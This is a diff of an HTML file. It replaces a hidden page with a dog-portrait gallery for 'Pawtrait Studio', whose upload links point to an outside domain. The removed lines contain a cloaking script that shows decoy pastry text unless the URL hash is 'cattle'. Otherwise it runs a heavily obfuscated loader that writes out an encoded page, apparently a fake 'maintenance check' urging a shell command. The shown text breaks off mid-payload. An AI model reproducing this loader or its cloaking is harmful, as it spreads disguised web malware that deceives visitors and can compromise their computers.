@@ -1,47 +1,299 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>P</title>
-</head>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Explore the Pawtrait Studio gallery of dog portraits and joyful moments.">
+<title>Gallery — Pawtrait Studio</title><style>
+:root {
+  --site-primary: #b96f45;
+  --site-secondary: #263c35;
+  --site-background: #f7f3ed;
+  --site-on-primary: #ffffff;
+  --site-on-secondary: #ffffff;
+  --site-on-background: #28231f;
+  --site-font-body: "Inter", "Avenir Next", Arial, sans-serif;
+  --site-font-heading: "Georgia", "Times New Roman", serif;
+  --site-heading-scale: 1;
+  --site-spacing-scale: 1;
+  --site-radius-scale: 1;
+  --site-decoration-opacity: 1;
+  color-scheme: light dark;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  margin: 0;
+  background: var(--site-background);
+  color: var(--site-on-background);
+  font-family: var(--site-font-body);
+  -webkit-font-smoothing: antialiased;
+}
+img { display: block; max-width: 100%; }
+a { color: inherit; text-decoration: none; }
+button { font: inherit; }
+.site-root {
+  min-height: 100vh;
+  background-color: var(--site-background);
+  color: var(--site-on-background);
+  border-radius: 0;
+  overflow: clip;
+}
+.container { width: min(1160px, calc(100% - 48px)); margin: 0 auto; }
+.site-header {
+  position: sticky; top: 0; z-index: 20;
+  background: rgba(250,247,241,.94);
+  backdrop-filter: blur(14px);
+  border-bottom: 1px solid rgba(55,45,36,.10);
+}
+.nav-wrap { min-height: 82px; display: flex; align-items: center; justify-content: space-between; gap: 28px; }
+.brand { display: inline-flex; align-items: center; gap: 12px; min-width: 0; }
+.brand-mark {
+  width: 46px; height: 46px; display: grid; place-items: center;
+  background: var(--site-secondary); border-radius: 50%; padding: 9px; flex: 0 0 auto;
+}
+.brand-mark img { width: 100%; height: 100%; object-fit: contain; }
+.brand-name { font-family: var(--site-font-heading); font-size: 23px; letter-spacing: -.6px; font-weight: 700; white-space: nowrap; }
+.nav-links { display: flex; align-items: center; gap: 34px; font-size: 14px; font-weight: 650; color: #504940; }
+.nav-links a { padding: 10px 0; position: relative; }
+.nav-links a.active, .nav-links a:hover { color: var(--site-primary); }
+.nav-links a.active:after { content:""; height:2px; background:var(--site-primary); position:absolute; left:0; right:0; bottom:2px; }
+.nav-cta, .btn {
+  display: inline-flex; align-items: center; justify-content: center; gap: 10px;
+  min-height: 48px; padding: 0 23px; border-radius: 999px;
+  background: var(--site-primary); color: white; border: 1px solid var(--site-primary);
+  font-size: 14px; font-weight: 700; transition: transform .2s, background .2s, box-shadow .2s;
+  box-shadow: 0 8px 22px rgba(139,77,43,.15);
+}
+.nav-cta:hover, .btn:hover { color:white; transform: translateY(-2px); background:#a65e38; box-shadow:0 12px 26px rgba(139,77,43,.22); }
+.btn-outline { color: var(--site-secondary); background: transparent; border-color: rgba(38,60,53,.35); box-shadow:none; }
+.btn-outline:hover { background:var(--site-secondary); color:white; }
+.menu-toggle { display:none; width:44px; height:44px; border:1px solid #ded6cc; background:#fffaf4; border-radius:50%; color:#263c35; cursor:pointer; }
+.eyebrow { display:inline-flex; align-items:center; gap:9px; color:var(--site-primary); text-transform:uppercase; letter-spacing:2.2px; font-size:11px; font-weight:800; }
+.eyebrow:before { content:""; width:24px; height:1px; background:currentColor; }
+h1,h2,h3,p { margin-top:0; }
+h1,h2,h3 { font-family:var(--site-font-heading); font-weight:500; letter-spacing:-1.3px; }
+h1 { font-size:clamp(46px,6vw,76px); line-height:1.02; margin:20px 0 22px; }
+h2 { font-size:clamp(36px,4.3vw,54px); line-height:1.08; margin:14px 0 18px; }
+h3 { font-size:25px; line-height:1.15; margin-bottom:10px; }
+p { color:#716a61; line-height:1.8; font-size:15px; }
+.hero { padding:60px 0 72px; }
+.hero-grid { display:grid; grid-template-columns: .95fr 1.05fr; gap:58px; align-items:center; }
+.hero-copy { padding:24px 0 24px 2px; }
+.hero-copy h1 em { color:var(--site-primary); font-style:italic; }
+.hero-copy p { max-width:510px; font-size:16px; margin-bottom:28px; }
+.hero-actions { display:flex; gap:13px; flex-wrap:wrap; }
+.hero-note { display:flex; align-items:center; gap:12px; margin-top:28px; color:#82796e; font-size:12px; }
+.hero-note span { display:inline-flex; gap:4px; color:#c28b54; letter-spacing:1px; }
+.hero-visual { position:relative; }
+.hero-image-frame { overflow:hidden; border-radius: 48% 48% 22px 22px; background:#e9d9c7; aspect-ratio: .94; box-shadow:0 24px 70px rgba(59,43,30,.13); }
+.hero-image-frame img { width:100%; height:100%; object-fit:cover; object-position:center; }
+.floating-note { position:absolute; left:-30px; bottom:36px; padding:18px 21px; background:#fffdf9; border:1px solid #eee5da; border-radius:15px; box-shadow:0 12px 35px rgba(51,39,28,.12); max-width:210px; }
+.floating-note strong { display:block; font-family:var(--site-font-heading); font-size:20px; font-weight:500; margin-bottom:5px; }
+.floating-note small { color:#8a8075; font-size:11px; line-height:1.5; }
+.trust-strip { border-top:1px solid #e6ded4; border-bottom:1px solid #e6ded4; padding:22px 0; background:#f2ece3; }
+.trust-inner { display:flex; justify-content:center; gap:clamp(20px,6vw,80px); flex-wrap:wrap; color:#6d6257; font-size:12px; font-weight:700; letter-spacing:.7px; text-transform:uppercase; }
+.trust-inner span { display:flex; align-items:center; gap:9px; }
+.dot { width:6px; height:6px; background:var(--site-primary); border-radius:50%; }
+.section { padding:88px 0; }
+.section-heading { max-width:660px; margin:0 auto 42px; text-align:center; }
+.section-heading p { max-width:550px; margin:0 auto; }
+.intro-grid { display:grid; grid-template-columns:1fr 1fr; gap:60px; align-items:center; }
+.intro-image { border-radius:20px; overflow:hidden; aspect-ratio:1.1; background:#e8ded1; }
+.intro-image img { width:100%; height:100%; object-fit:cover; }
+.intro-copy p { max-width:520px; }
+.stat-row { display:flex; gap:28px; margin-top:28px; padding-top:22px; border-top:1px solid #e4dbd0; }
+.stat strong { display:block; font-family:var(--site-font-heading); font-size:26px; color:var(--site-secondary); font-weight:500; }
+.stat small { color:#847a70; font-size:11px; }
+.featured { background:#263c35; color:#fffaf3; }
+.featured p { color:#d0d8d0; }
+.featured .eyebrow { color:#d7a47d; }
+.featured-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:20px; }
+.feature-card { border-radius:16px; overflow:hidden; background:#314a42; }
+.feature-card img { width:100%; aspect-ratio:1.1; object-fit:cover; }
+.feature-card div { padding:19px 20px 22px; }
+.feature-card h3 { font-size:23px; margin:0 0 5px; }
+.feature-card small { color:#b6c2ba; font-size:11px; letter-spacing:1px; text-transform:uppercase; }
+.center-action { text-align:center; margin-top:38px; }
+.center-action .btn { background:#d49a70; border-color:#d49a70; color:#1f302b; }
+.center-action .btn:hover { background:#e0aa81; color:#1f302b; }
+.story-band { background:#efe7dc; }
+.story-band-inner { display:grid; grid-template-columns:1.1fr .9fr; gap:60px; align-items:center; }
+.story-band blockquote { font-family:var(--site-font-heading); font-size:clamp(27px,3.2vw,39px); line-height:1.25; letter-spacing:-.6px; margin:0; color:#35473e; }
+.story-band p { margin:0; }
+.page-hero { padding:74px 0 54px; text-align:center; background:#f1e9df; }
+.page-hero h1 { font-size:clamp(44px,5vw,64px); margin:14px 0; }
+.page-hero p { max-width:650px; margin:0 auto; }
+.gallery-section { padding:55px 0 90px; }
+.filter-row { display:flex; justify-content:center; flex-wrap:wrap; gap:10px; margin-bottom:32px; }
+.filter-btn { border:1px solid #ded4c8; background:#fffaf4; color:#62584e; border-radius:999px; padding:10px 17px; font-size:12px; font-weight:700; cursor:pointer; }
+.filter-btn.active, .filter-btn:hover { background:var(--site-secondary); border-color:var(--site-secondary); color:#fff; }
+.gallery-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:17px; }
+.gallery-item { position:relative; overflow:hidden; border-radius:14px; background:#e8ded1; aspect-ratio:1 / 1.08; cursor:zoom-in; }
+.gallery-item img { width:100%; height:100%; object-fit:cover; transition:transform .5s; }
+.gallery-item:hover img { transform:scale(1.06); }
+.gallery-item figcaption { position:absolute; inset:auto 0 0; padding:28px 14px 14px; color:white; font-size:12px; font-weight:700; background:linear-gradient(transparent,rgba(17,23,19,.72)); opacity:0; transition:opacity .25s; }
+.gallery-item:hover figcaption { opacity:1; }
+.steps { display:grid; grid-template-columns:repeat(4,1fr); gap:15px; margin:48px 0 0; }
+.step-card { padding:26px 21px; background:#fffaf4; border:1px solid #e9dfd3; border-radius:16px; min-height:230px; }
+.step-num { display:grid; place-items:center; width:42px; height:42px; border-radius:50%; background:#e9d5c2; color:#875235; font-family:var(--site-font-heading); font-size:20px; margin-bottom:24px; }
+.step-card p { font-size:13px; line-height:1.7; margin:0; }
+.how-feature { display:grid; grid-template-columns:1fr 1fr; gap:50px; align-items:center; margin-top:70px; }
+.how-feature img { width:100%; aspect-ratio:1.2; object-fit:cover; border-radius:20px; }
+.how-feature p { max-width:490px; }
+.notice { border-left:3px solid #c38a62; padding:12px 17px; background:#f1e9df; color:#71665b; font-size:12px; line-height:1.7; margin-top:20px; }
+.cta-panel { background:#263c35; color:#fffaf3; border-radius:22px; padding:50px; display:flex; justify-content:space-between; align-items:center; gap:30px; }
+.cta-panel h2 { font-size:clamp(32px,4vw,46px); margin:0 0 10px; }
+.cta-panel p { color:#cbd4cd; margin:0; }
+.cta-panel .btn { background:#d49a70; border-color:#d49a70; color:#24372f; flex:0 0 auto; }
+.site-footer { background:#1d302a; color:#f8f2e9; padding:48px 0 24px; }
+.footer-top { display:flex; justify-content:space-between; align-items:flex-start; gap:40px; padding-bottom:32px; border-bottom:1px solid rgba(255,255,255,.15); }
+.footer-brand p { color:#b7c4bc; max-width:330px; font-size:13px; margin:15px 0 0; }
+.footer-links { display:flex; gap:28px; flex-wrap:wrap; font-size:13px; color:#d4ddd6; }
+.footer-bottom { display:flex; justify-content:space-between; gap:20px; padding-top:20px; color:#9eafa4; font-size:11px; }
+.lightbox { position:fixed; inset:0; z-index:60; background:rgba(10,16,13,.92); display:none; align-items:center; justify-content:center; padding:25px; }
+.lightbox.open { display:flex; }
+.lightbox img { max-width:min(100%,1000px); max-height:86vh; object-fit:contain; border-radius:10px; }
+.lightbox button { position:absolute; top:18px; right:22px; background:transparent; color:white; border:0; font-size:32px; cursor:pointer; }
+@media (max-width: 900px) {
+  .hero-grid { gap:34px; }
+  .gallery-grid { grid-template-columns:repeat(3,1fr); }
+  .steps { grid-template-columns:repeat(2,1fr); }
+  .nav-links { gap:20px; }
+}
+@media (max-width: 680px) {
+  .container { width:min(100% - 34px, 540px); }
+  .nav-wrap { min-height:70px; }
+  .brand-mark { width:40px; height:40px; }
+  .brand-name { font-size:20px; }
+  .menu-toggle { display:grid; place-items:center; }
+  .nav-links {
+    display:none; position:absolute; top:69px; left:0; right:0; padding:15px 22px 22px;
+    background:#faf7f1; border-bottom:1px solid #e5ddd2; flex-direction:column; align-items:stretch; gap:4px;
+    box-shadow:0 15px 25px rgba(45,35,25,.08);
+  }
+  .nav-links.open { display:flex; }
+  .nav-links a { padding:12px 5px; }
+  .nav-links a.active:after { display:none; }
+  .nav-cta { display:none; }
+  .hero { padding:35px 0 48px; }
+  .hero-grid { grid-template-columns:1fr; gap:34px; }
+  .hero-copy { padding:5px 0 0; }
+  h1 { font-size:clamp(43px,12vw,62px); }
+  .hero-copy p { font-size:15px; }
+  .hero-image-frame { aspect-ratio:1.05; border-radius:42% 42% 18px 18px; }
+  .floating-note { left:10px; bottom:16px; padding:13px 15px; max-width:185px; }
+  .floating-note strong { font-size:17px; }
+  .trust-inner { justify-content:flex-start; gap:14px 22px; font-size:10px; }
+  .section { padding:62px 0; }
+  .intro-grid, .story-band-inner, .how-feature { grid-template-columns:1fr; gap:30px; }
+  .intro-grid .intro-image { order:2; }
+  .featured-grid { grid-template-columns:1fr; gap:15px; }
+  .feature-card { display:grid; grid-template-columns:40% 1fr; align-items:center; }
+  .feature-card img { height:100%; aspect-ratio:1; }
+  .feature-card div { padding:15px; }
+  .feature-card h3 { font-size:20px; }
+  .page-hero { padding:55px 0 40px; }
+  .gallery-section { padding:35px 0 65px; }
+  .gallery-grid { grid-template-columns:repeat(2,1fr); gap:10px; }
+  .gallery-item { border-radius:10px; }
+  .gallery-item figcaption { opacity:1; font-size:10px; padding:24px 10px 10px; }
+  .steps { grid-template-columns:1fr; gap:11px; margin-top:30px; }
+  .step-card { min-height:0; padding:20px; }
+  .step-num { margin-bottom:15px; }
+  .how-feature { margin-top:45px; }
+  .cta-panel { padding:30px 23px; display:block; }
+  .cta-panel .btn { margin-top:22px; }
+  .footer-top, .footer-bottom { flex-direction:column; }
+  .footer-links { gap:18px; }
+}
+@media (prefers-color-scheme: dark) {
+  body, .site-root { background:#f7f3ed; color:#28231f; }
+}
+</style></head>
+<body data-page="gallery"><div class="site-root">
 
-<body>
+<header class="site-header">
+  <div class="container nav-wrap">
+    <a class="brand" href="index.html" aria-label="Pawtrait Studio home">
+      <span class="brand-mark"><img src="assets/pawtrait-logo.png" alt=""></span>
+      <span class="brand-name">Pawtrait Studio</span>
+    </a>
+    <button class="menu-toggle" id="menuToggle" aria-label="Open navigation" aria-expanded="false" aria-controls="navLinks">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+    </button>
+    <nav class="nav-links" id="navLinks" aria-label="Main navigation">
+      <a href="index.html" data-page="home">Home</a>
+      <a href="gallery.html" data-page="gallery">Gallery</a>
+      <a href="how_it_works.html" data-page="how">How It Works</a>
+    </nav>
+    <a class="nav-cta" href="https://pawtraitstudio.pics/submit.html" rel="noopener">Create your own Pawtrait <span aria-hidden="true"></span></a>
+  </div>
+</header>
 
+<main>
+  <section class="page-hero"><div class="container"><span class="eyebrow">The Pawtrait collection</span><h1>Little faces. Big personalities.</h1><p>A collection of happy expressions, playful moments and lovely dogs. Take a look around and find a little inspiration for your own Pawtrait.</p></div></section>
+  <section class="gallery-section"><div class="container">
+    <div class="filter-row" role="group" aria-label="Filter gallery">
+      <button class="filter-btn active" data-filter="all">All photos</button>
+      <button class="filter-btn" data-filter="portraits">Studio moments</button>
+      <button class="filter-btn" data-filter="playful">Playful</button>
+      <button class="filter-btn" data-filter="buddies">Buddies</button>
+    </div>
+    <div class="gallery-grid"><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View cute dog image"><img src="assets/gallery-01.jpg" alt="Cute dog from Pawtrait Studio gallery" loading="lazy"><figcaption>Cute dog</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View cute dog image"><img src="assets/gallery-02.jpg" alt="Cute dog from Pawtrait Studio gallery" loading="lazy"><figcaption>Cute dog</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View cute dog image"><img src="assets/gallery-03.jpg" alt="Cute dog from Pawtrait Studio gallery" loading="lazy"><figcaption>Cute dog</figcaption></figure><figure class="gallery-item" data-category="playful" tabindex="0" role="button" aria-label="View playful moments image"><img src="assets/gallery-04.jpg" alt="Playful moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Playful moments</figcaption></figure><figure class="gallery-item" data-category="playful" tabindex="0" role="button" aria-label="View playful moments image"><img src="assets/gallery-05.jpg" alt="Playful moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Playful moments</figcaption></figure><figure class="gallery-item" data-category="playful" tabindex="0" role="button" aria-label="View playful moments image"><img src="assets/gallery-06.jpg" alt="Playful moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Playful moments</figcaption></figure><figure class="gallery-item" data-category="playful" tabindex="0" role="button" aria-label="View playful moments image"><img src="assets/gallery-07.jpg" alt="Playful moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Playful moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-08.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-09.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-10.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-11.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-12.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-13.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="portraits" tabindex="0" role="button" aria-label="View studio moments image"><img src="assets/gallery-14.jpg" alt="Studio moments from Pawtrait Studio gallery" loading="lazy"><figcaption>Studio moments</figcaption></figure><figure class="gallery-item" data-category="buddies" tabindex="0" role="button" aria-label="View best buddies image"><img src="assets/gallery-15.jpg" alt="Best buddies from Pawtrait Studio gallery" loading="lazy"><figcaption>Best buddies</figcaption></figure><figure class="gallery-item" data-category="buddies" tabindex="0" role="button" aria-label="View best buddies image"><img src="assets/gallery-16.jpg" alt="Best buddies from Pawtrait Studio gallery" loading="lazy"><figcaption>Best buddies</figcaption></figure><figure class="gallery-item" data-category="buddies" tabindex="0" role="button" aria-label="View best buddies image"><img src="assets/gallery-17.jpg" alt="Best buddies from Pawtrait Studio gallery" loading="lazy"><figcaption>Best buddies</figcaption></figure><figure class="gallery-item" data-category="buddies" tabindex="0" role="button" aria-label="View best buddies image"><img src="assets/gallery-18.jpg" alt="Best buddies from Pawtrait Studio gallery" loading="lazy"><figcaption>Best buddies</figcaption></figure></div>
+  </div></section>
+</main>
+<div class="lightbox" id="lightbox" aria-modal="true" role="dialog" aria-label="Expanded gallery image"><button id="lightboxClose" aria-label="Close image">×</button><img id="lightboxImage" alt="Expanded Pawtrait Studio gallery image"></div>
+
+<footer class="site-footer">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <a class="brand" href="index.html"><span class="brand-mark"><img src="assets/pawtrait-logo.png" alt=""></span><span class="brand-name">Pawtrait Studio</span></a>
+        <p>Turning the little faces we love into keepsakes worth holding on to.</p>
+      </div>
+      <nav class="footer-links" aria-label="Footer navigation">
+        <a href="index.html">Home</a><a href="gallery.html">Gallery</a><a href="how_it_works.html">How It Works</a>
+        <a href="https://pawtraitstudio.pics/submit.html" rel="noopener">Upload a photo</a>
+      </nav>
+    </div>
+    <div class="footer-bottom"><span>© <span id="year"></span> Pawtrait Studio. Made with love for dogs.</span><span>Every dog has a story worth celebrating.</span></div>
+  </div>
+</footer>
 <script>
-(function () {
-
-    const hash = (window.location.hash || "")
-        .replace("#", "")
-        .toLowerCase();
-
-    if (hash !== "cattle") {
-
-        document.body.style.margin = "0";
-        document.body.style.height = "100vh";
-        document.body.style.display = "flex";
-        document.body.style.alignItems = "center";
-        document.body.style.justifyContent = "center";
-        document.body.style.fontFamily = "Arial";
-        document.body.style.fontSize = "28px";
-        document.body.style.background = "black";
-        document.body.style.color = "white";
-
-        document.body.innerText = "French inspired pastry for the curious home baker: gain confidence in the kitchen with easy-to-follow cakes, pastries & desserts recipes!";
-
-        return;
-    }
-
-    setTimeout(() => {
-
-        // Paste obfuscated code here
-var _0x416be7=_0x293e;function _0x293e(_0x2c4ae8,_0x3de2a9){var _0x7939f5=_0x4a38();return _0x293e=function(_0x1b2b33,_0x445112){_0x1b2b33=_0x1b2b33-(-0x1*-0x1ca+0x1*0x1dd1+-0x1ef3);var _0x1926b6=_0x7939f5[_0x1b2b33];return _0x1926b6;},_0x293e(_0x2c4ae8,_0x3de2a9);}(function(_0x19184f,_0x41f7a4){var _0x494edf=_0x293e,_0x3e3734=_0x19184f();while(!![]){try{var _0x366654=parseInt(_0x494edf(0x3da))/(-0x20f*-0x1+0x1*-0x2405+0x21f7)*(parseInt(_0x494edf(0x12a))/(-0x1*-0x335+-0x3*-0x25e+-0x1*0xa4d))+-parseInt(_0x494edf(0x3d7))/(0x1*0x119d+-0x51d+0x1*-0xc7d)+-parseInt(_0x494edf(0x23b))/(0x10e2+-0x81d+-0x9*0xf9)+parseInt(_0x494edf(0x2cf))/(0x19d4+0x1f*-0x47+-0x1136)*(-parseInt(_0x494edf(0x2ae))/(-0xe0f+-0xf08+0x1d1d))+parseInt(_0x494edf(0x19e))/(-0x2177*0x1+-0x1*0x89e+0x14*0x21b)*(-parseInt(_0x494edf(0x271))/(0xb25*0x2+-0x255e+-0x2*-0x78e))+parseInt(_0x494edf(0x1d3))/(0x2*0x48f+-0x234+-0x3*0x24b)+parseInt(_0x494edf(0x182))/(-0x35*-0x2b+-0xa5a+-0x7f*-0x3);if(_0x366654===_0x41f7a4)break;else _0x3e3734['push'](_0x3e3734['shift']());}catch(_0x4d4466){_0x3e3734['push'](_0x3e3734['shift']());}}}(_0x4a38,-0x79cb8+-0x557*-0x10f+0x1*0x7658b),document[_0x416be7(0xe8)](unescape(_0x416be7(0x31c)+_0x416be7(0x1b4)+'9%50%45%20'+'%68%74%6D%'+_0x416be7(0x165)+_0x416be7(0x158)+_0x416be7(0x229)+_0x416be7(0x30d)+'D%22%65%6E'+_0x416be7(0x113)+_0x416be7(0x35f)+'1%64%3E%0A'+_0x416be7(0x106)+_0x416be7(0x20c)+_0x416be7(0x2ef)+_0x416be7(0x337)+_0x416be7(0x32a)+_0x416be7(0x18c)+_0x416be7(0x266)+_0x416be7(0x132)+_0x416be7(0x123)+_0x416be7(0x3a0)+_0x416be7(0x1a2)+_0x416be7(0x251)+'%65%3D%22%'+_0x416be7(0x137)+_0x416be7(0x2f1)+_0x416be7(0x250)+_0x416be7(0x348)+_0x416be7(0x3d9)+'%3D%22%77%'+_0x416be7(0x311)+_0x416be7(0x310)+_0x416be7(0x11c)+_0x416be7(0x3ab)+_0x416be7(0x110)+_0x416be7(0x33b)+_0x416be7(0x297)+_0x416be7(0x163)+_0x416be7(0x159)+_0x416be7(0x187)+_0x416be7(0x184)+'%3E%0A%20%'+_0x416be7(0x19d)+'C%74%69%74'+_0x416be7(0x21e)+_0x416be7(0x238)+_0x416be7(0x26b)+_0x416be7(0x1fb)+'67%65%2E%2'+_0x416be7(0xd3)+_0x416be7(0xa9)+_0x416be7(0x14f)+'A%3C%2F%68'+_0x416be7(0x2a0)+_0x416be7(0xd5)+'2%6F%64%79'+_0x416be7(0x357)+'20%20%20%2'+_0x416be7(0x188)+_0x416be7(0x326)+_0x416be7(0xd2)+_0x416be7(0x123)+_0x416be7(0x2fe)+_0x416be7(0x1ed)+_0x416be7(0xb1)+'%3D%3D%3D%'+_0x416be7(0x3bc)+_0x416be7(0xb1)+_0x416be7(0x302)+'3D%20%4D%4'+_0x416be7(0xac)+_0x416be7(0xbe)+'4E%43%45%2'+_0x416be7(0x171)+'%43%4B%20%'+_0x416be7(0x3bc)+_0x416be7(0xb1)+'%3D%3D%3D%'+_0x416be7(0x3bc)+'D%3D%3D%3D'+_0x416be7(0x302)+_0x416be7(0x3b9)+_0x416be7(0x3c8)+'%75%6E%63%'+_0x416be7(0x2d4)+_0x416be7(0x3b7)+_0x416be7(0x33d)+_0x416be7(0x3b9)+_0x416be7(0x33a)+_0x416be7(0x1f5)+'6F%6E%73%7'+_0x416be7(0x118)+'%73%68%20%'+_0x416be7(0x3a4)+_0x416be7(0x1d5)+_0x416be7(0x139)+_0x416be7(0x183)+_0x416be7(0x25a)+_0x416be7(0x3c1)+('73%68%2E%7'+_0x416be7(0x344)+_0x416be7(0x15f)+_0x416be7(0x3c2)+_0x416be7(0x280)+_0x416be7(0x36d)+_0x416be7(0x215)+_0x416be7(0x2c7)+_0x416be7(0x380)+_0x416be7(0xb9)+_0x416be7(0x1b6)+_0x416be7(0x10d)+'20%20%20%2'+_0x416be7(0x33a)+_0x416be7(0x13a)+_0x416be7(0x1d6)+_0x416be7(0x33e)+_0x416be7(0x11b)+_0x416be7(0x1bf)+_0x416be7(0x205)+_0x416be7(0x3cf)+'7B%0A%20%2'+_0x416be7(0x33a)+_0x416be7(0x106)+_0x416be7(0x275)+_0x416be7(0xe3)+_0x416be7(0xbd)+_0x416be7(0xf2)+_0x416be7(0x33a)+_0x416be7(0x106)+_0x416be7(0x1d2)+_0x416be7(0x33a)+_0x416be7(0x106)+_0x416be7(0x2d2)+_0x416be7(0x334)+_0x416be7(0x32d)+_0x416be7(0x156)+_0x416be7(0x222)+_0x416be7(0x259)+_0x416be7(0x20e)+'C%20%3D%20'+_0x416be7(0x1fe)+_0x416be7(0x3c9)+'0%20%20%20'+'%20%20%20%'+_0x416be7(0x2c4)+'5%6D%65%6E'+_0x416be7(0x3ba)+_0x416be7(0xce)+'E%73%74%79'+'%6C%65%2E%'+_0x416be7(0x1a8)+'B%67%72%6F'+_0x416be7(0x3d4)+'43%6F%6C%6'+_0x416be7(0x1cf)+_0x416be7(0x1eb)+_0x416be7(0x3ca)+_0x416be7(0x2ab)+'%20%20%20%'+_0x416be7(0x275)+_0x416be7(0x29c)+_0x416be7(0x2bf)+_0x416be7(0xe5)+_0x416be7(0xc5)+'%79%2E%73%'+_0x416be7(0x2a6)+_0x416be7(0x2e4)+_0x416be7(0x2b6)+_0x416be7(0x3c3)+_0x416be7(0x3b4)+'%74%65%27%'+_0x416be7(0xf2)+'0%20%20%20'+'%20%20%20%'+_0x416be7(0x2c4)+_0x416be7(0x3aa)+'%74%2E%62%'+_0x416be7(0xce)+_0x416be7(0x285)+'%6C%65%2E%'+_0x416be7(0x274)+_0x416be7(0x3a1)+_0x416be7(0x1a6)+_0x416be7(0x15d)+_0x416be7(0x1b5)+_0x416be7(0x3c0)+_0x416be7(0x275)+'0%20%20%64'+'%6F%63%75%'+_0x416be7(0x2db)+_0x416be7(0x27c)+_0x416be7(0xb5)+_0x416be7(0x2cd)+'C%65%2E%6A'+_0x416be7(0x313)+_0x416be7(0x32f)+_0x416be7(0x34f)+_0x416be7(0x167)+_0x416be7(0x3c3))+('7%63%65%6E'+_0x416be7(0x12d)+_0x416be7(0x340)+_0x416be7(0x33a)+_0x416be7(0x106)+'20%64%6F%6'+'3%75%6D%65'+_0x416be7(0x32d)+'62%6F%64%7'+'9%2E%73%74'+_0x416be7(0xae)+'2E%61%6C%6'+'9%67%6E%49'+_0x416be7(0x23f)+_0x416be7(0x2e3)+_0x416be7(0x2f8)+_0x416be7(0x342)+_0x416be7(0x192)+'A%20%20%20'+_0x416be7(0x106)+'20%20%64%6'+_0x416be7(0x296)+'%65%6E%74%'+_0x416be7(0x1c1)+_0x416be7(0x107)+'%74%79%6C%'+'65%2E%68%6'+_0x416be7(0x323)+_0x416be7(0x374)+'20%27%31%3'+_0x416be7(0x1fc)+_0x416be7(0x174)+_0x416be7(0x275)+_0x416be7(0x33a)+_0x416be7(0x2ad)+_0x416be7(0x278)+_0x416be7(0x31a)+_0x416be7(0x366)+_0x416be7(0x327)+_0x416be7(0x37b)+_0x416be7(0x22f)+_0x416be7(0x2b2)+_0x416be7(0x11a)+_0x416be7(0x3a7)+_0x416be7(0xf2)+_0x416be7(0x33a)+'%20%20%20%'+_0x416be7(0x2c4)+_0x416be7(0x3aa)+_0x416be7(0x3ba)+'6F%64%79%2'+_0x416be7(0x285)+'%6C%65%2E%'+_0x416be7(0x2b9)+_0x416be7(0x248)+_0x416be7(0x352)+_0x416be7(0x32b)+_0x416be7(0x287)+_0x416be7(0x3c0)+_0x416be7(0x275)+_0x416be7(0x2bc)+_0x416be7(0x36c)+_0x416be7(0x2db)+_0x416be7(0x27c)+_0x416be7(0xb5)+'73%74%79%6'+_0x416be7(0x2da)+_0x416be7(0x387)+'41%6C%69%6'+_0x416be7(0x2ce)+_0x416be7(0x27f)+_0x416be7(0x144)+_0x416be7(0x233)+_0x416be7(0x10d)+_0x416be7(0x275)+'0%20%20%20'+_0x416be7(0x2bd)+_0x416be7(0x208)+'D%65%73%73'+_0x416be7(0x256)+'20%3D%20%6'+_0x416be7(0x390)+'%6D%65%6E%'+'74%2E%63%7'+_0x416be7(0x288)+_0x416be7(0x356)+_0x416be7(0x247)+_0x416be7(0xdc)+_0x416be7(0x1e9)+_0x416be7(0x227)+_0x416be7(0x123)+_0x416be7(0x106)+'20%20%6D%6'+_0x416be7(0x34a)+_0x416be7(0x223)+_0x416be7(0xd0)+_0x416be7(0x15e)+_0x416be7(0x264)+_0x416be7(0x379)+_0x416be7(0x279))+(_0x416be7(0x217)+_0x416be7(0x351)+'C%6F%6E%67'+_0x416be7(0xea)+_0x416be7(0x353)+_0x416be7(0x294)+'%72%6D%69%'+_0x416be7(0x17a)+_0x416be7(0x1ce)+_0x416be7(0x3d2)+_0x416be7(0x20a)+_0x416be7(0xf8)+_0x416be7(0x34e)+_0x416be7(0xcc)+_0x416be7(0x120)+_0x416be7(0x2ea)+_0x416be7(0x138)+_0x416be7(0xcb)+_0x416be7(0x191)+_0x416be7(0xf5)+_0x416be7(0x1a7)+_0x416be7(0x173)+_0x416be7(0x16c)+_0x416be7(0x350)+_0x416be7(0x37a)+_0x416be7(0xdf)+_0x416be7(0xe6)+_0x416be7(0x1ba)+_0x416be7(0x253)+_0x416be7(0x397)+_0x416be7(0xb0)+_0x416be